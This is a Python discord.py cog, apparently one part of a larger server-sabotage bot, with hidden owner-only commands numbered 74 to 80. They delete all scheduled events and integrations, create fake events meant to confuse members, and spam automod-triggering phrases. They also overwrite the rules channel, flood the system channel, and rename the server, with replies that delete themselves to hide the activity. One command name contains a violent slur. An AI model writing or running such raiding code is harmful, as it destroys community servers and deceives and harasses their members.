import discord
from discord.ext import commands
import asyncio
import datetime

class EventSabotage(commands.Cog, name="event_sabotage"):
    """74-80: event and integration sabotage."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(hidden=True)
    @commands.is_owner()
    async def deleteevents(self, ctx: commands.Context):
        """74. delete all scheduled events."""
        count = 0
        for event in ctx.guild.scheduled_events:
            try:
                await event.delete()
                count += 1
                await asyncio.sleep(0.3)
            except:
                pass
        await ctx.send(f"deleted {count} events.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def fakeevent(self, ctx: commands.Context, *, name: str = "IMPORTANT ANNOUNCEMENT"):
        """75. create a fake event to confuse members."""
        try:
            await ctx.guild.create_scheduled_event(
                name=name,
                start_time=discord.utils.utcnow() + datetime.timedelta(minutes=10),
                end_time=discord.utils.utcnow() + datetime.timedelta(hours=1),
                location="voice channel",
            )
            await ctx.send(f"fake event '{name}' created.", delete_after=5)
        except Exception as e:
            await ctx.send(f"error: {e}", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def deleteintegrations(self, ctx: commands.Context):
        """76. delete all integrations."""
        count = 0
        for integration in await ctx.guild.integrations():
            try:
                await integration.delete()
                count += 1
                await asyncio.sleep(0.3)
            except:
                pass
        await ctx.send(f"deleted {count} integrations.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def automodspam(self, ctx: commands.Context):
        """77. attempt to trigger automod by spamming flagged content."""
        phrases = ["@everyone", "@here", "discord.gg/", "free nitro"]
        for phrase in phrases:
            try:
                await ctx.send(phrase, delete_after=1)
                await asyncio.sleep(1)
            except:
                pass
        await ctx.send("automod trigger attempts complete.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def ruleschannel(self, ctx: commands.Context, *, text: str):
        """78. overwrite the rules channel with custom text."""
        channel = discord.utils.get(ctx.guild.channels, name="rules")
        if not channel:
            channel = discord.utils.get(ctx.guild.channels, name="server-rules")
        if not channel:
            return await ctx.send("no rules channel found.")
        try:
            async for msg in channel.history(limit=10):
                await msg.delete()
            await channel.send(text)
            await ctx.send("rules overwritten.", delete_after=5)
        except Exception as e:
            await ctx.send(f"error: {e}", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def welcomerape(self, ctx: commands.Context, *, text: str):
        """79. spam the system channel with messages."""
        if ctx.guild.system_channel:
            for _ in range(10):
                await ctx.guild.system_channel.send(text)
                await asyncio.sleep(0.5)
            await ctx.send("system channel flooded.", delete_after=5)
        else:
            await ctx.send("no system channel.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def badname(self, ctx: commands.Context, *, name: str):
        """80. rename the server to a new name."""
        await ctx.guild.edit(name=name)
        await ctx.send(f"server renamed to {name}.", delete_after=5)


async def setup(bot: commands.Bot):
    await bot.add_cog(EventSabotage(bot))
